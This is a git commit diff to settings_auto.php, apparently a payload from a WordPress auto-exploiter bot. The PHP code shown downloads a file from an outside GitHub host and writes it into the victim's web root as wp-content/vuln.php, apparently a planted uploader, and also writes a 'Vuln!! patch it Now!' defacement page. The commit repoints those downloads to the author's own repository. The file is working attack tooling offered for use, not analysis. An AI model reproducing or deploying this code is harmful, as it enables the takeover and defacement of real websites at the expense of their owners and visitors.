bc75ff0af8b213e1d47636fcab9a30396b276d32
Mister Spy <admin@misterspybot.com>
2018-09-01 07:53:45 +0100

    ui

--- files/settings_auto.php
+++ files/settings_auto.php
@@ -1,4 +1,4 @@
-<title>Vuln!! patch it Now!</title>
+<title>Vuln!! patch it Now!MrSpyUp!!</title>
 <?php
 function http_get($url){
 	$im = curl_init($url);
@@ -10,7 +10,7 @@ function http_get($url){
 	curl_close($im);
 }
 $check = $_SERVER['DOCUMENT_ROOT'] . "/wp-content/vuln.php" ;
-$text = http_get('https://raw.githubusercontent.com/04x/ICG-AutoExploiterBoT/master/files/up.php');
+$text = http_get('https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php');
 $open = fopen($check, 'w');
 fwrite($open, $text);
 fclose($open);
@@ -21,7 +21,7 @@ if(file_exists($check)){
 echo "done .\n " ;
 
 $check2 = $_SERVER['DOCUMENT_ROOT'] . "/vuln.htm" ;
-$text2 = http_get('https://raw.githubusercontent.com/04x/ICG-AutoExploiterBoT/master/files/vuln.txt');
+$text2 = http_get('https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/vuln.txt');
 $open2 = fopen($check2, 'w');
 fwrite($open2, $text2);
 fclose($open2);
